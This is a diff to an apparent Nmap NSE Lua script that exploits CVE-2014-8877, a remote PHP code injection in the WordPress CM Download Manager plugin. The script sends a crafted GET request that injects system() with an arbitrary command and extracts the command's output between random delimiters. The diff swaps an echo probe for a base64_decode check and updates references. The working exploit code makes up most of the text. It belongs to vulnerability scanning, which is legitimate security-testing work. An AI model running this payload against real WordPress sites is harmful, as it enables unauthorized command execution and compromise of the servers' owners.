@@ -3,6 +3,7 @@ local shortport = require "shortport"
 local stdnse = require "stdnse"
 local url = require "url"
 local vulns = require "vulns"
+local base64 = require "base64"
 
 description = [[
 Exploits a remote code injection vulnerability (CVE-2014-8877) in Wordpress CM Download Manager plugin. Versions <= 2.0.0 are known to be affected.
@@ -34,7 +35,6 @@ The script injects PHP system() function into the vulnerable target in order to 
 -- |     Exploit results:
 -- |       Linux debian 3.2.0-4-amd64 #1 SMP Debian 3.2.51-1 x86_64 GNU/Linux
 -- |     References:
--- |       http://www.itas.vn/news/code-injection-in-cm-download-manager-plugin-66.html?language=en
 -- |_      https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-8877 
 --
 -- @args http-vuln-cve2014-8877.uri Wordpress root directory on the website. Default: /
@@ -54,9 +54,10 @@ function genHttpReq(host, port, uri, cmd)
 
   if cmd ~= nil then
     payload = '".system("'..cmd..'")."'
- else
+  else
     rnd = stdnse.generate_random_string(15)
-    payload = '".system("echo '..rnd..'")."'
+    encRnd = base64.enc(rnd)
+    payload = '".base64_decode("'..encRnd..'")."'
   end
 
   local finalUri = uri..vulnPath..url.escape(payload)
@@ -64,7 +65,7 @@ function genHttpReq(host, port, uri, cmd)
 
   stdnse.debug(1, string.format("Sending GET '%s' request", uri..vulnPath..payload))
 
-  if not(payload) then
+  if not(rnd) then
     return req
   else 
     return req, rnd
@@ -92,8 +93,7 @@ CMDsearch parameter to cmdownloads/, which is processed by the PHP
       ]],
       IDS = {CVE = 'CVE-2014-8877'},
       references = {
-          'http://www.itas.vn/news/code-injection-in-cm-download-manager-plugin-66.html?language=en',
-          'https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-8877',
+          'www.securityfocus.com/bid/71204/'
       },
       dates = {
           disclosure = {year = '2014', month = '11', day = '14'},
@@ -105,12 +105,13 @@ CMDsearch parameter to cmdownloads/, which is processed by the PHP
     -- exploit the vulnerability
     if cmd ~= nil then
        -- wrap cmd with pattern which is used to filter out only relevant output from the response
-       req = genHttpReq(host, port, uri, 'echo ZZZ;'..cmd..';echo ZZZ;')
+       local pattern = stdnse.generate_random_string(5)
+       req = genHttpReq(host, port, uri, 'echo '..pattern..';'..cmd..';echo '..pattern..';')
 
        if req.status == 200 then
          -- take first lazy match as command output
          local cmdOut = nil
-         for m in string.gmatch(req.body, 'ZZZ\n(.-)\nZZZ') do
+         for m in string.gmatch(req.body, pattern..'\n(.-)\n'..pattern) do
            cmdOut = m
            break
          end
@@ -124,3 +125,4 @@ CMDsearch parameter to cmdownloads/, which is processed by the PHP
     return vulnReport:make_output(vuln)
   end
 end
+
